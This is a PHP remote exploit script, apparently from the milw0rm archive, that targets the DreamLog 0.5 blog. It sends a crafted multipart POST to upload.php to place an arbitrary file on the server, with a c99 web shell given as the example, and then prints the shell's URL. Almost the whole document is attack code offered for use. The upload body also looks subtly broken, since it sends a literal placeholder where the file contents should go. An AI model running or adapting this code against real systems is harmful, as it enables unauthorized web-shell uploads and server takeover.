<?

/*
        \\\|///
      \\  - -  //
       (  @ @ )
----oOOo--(_)-oOOo---------------------------------------------------

[ Y! Underground Group ]
[   Dj7xpl@yahoo.com   ]
[    Dj7xpl.2600.ir    ]

----ooooO-----Ooooo--------------------------------------------------
    (   )     (   )
     \ (       ) /
      \_)     (_/

---------------------------------------------------------------------

[!] Portal        :   DreamLog v0.5
[!] Download      :   http://sourceforge.net/projects/dreamblog/
[!] Author        :   Dj7xpl

---------------------------------------------------------------------
*/
// Print header
print_r('

__________________________________________________________________________
[*] DreamLog Version 0.5 Remote Exploit
[*] Vuln And Coded By Dj7xpl
__________________________________________________________________________

');

// Print Usage
if ($argc<4) {
print_r('
__________________________________________________________________________

Usage: php '.$argv[0].' host path File OPTIONS
host:      Target Ip Ro Hostname
path:      path to Forum
File:      File For Upload
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /Blog/ C:\shell\c99.php -P1.1.1.1:80

__________________________________________________________________________

');
die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
// argv
$host=$argv[1];
$path=$argv[2];
$f=$argv[3];
$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

// Data

$data='-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="MAX_FILE_SIZE";

9999999
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="uploadedFile[]";

".$f."
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="submit";

UPLOAD
-----------------------------7d61bcd1f033e
';
// Send Data To Target ;)

$packet ="POST ".$path."upload.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);
// Print End Message
Print "Exploit succeeded... ;)\r\n";
print "Sh3ll : http://".$host."".$path."uploads/images/Filename <---Your File Name\r\n";
print "Example : http://localhost/blog/uploads/images/c99.php\r\n";
?>

# milw0rm.com [2007-06-25]
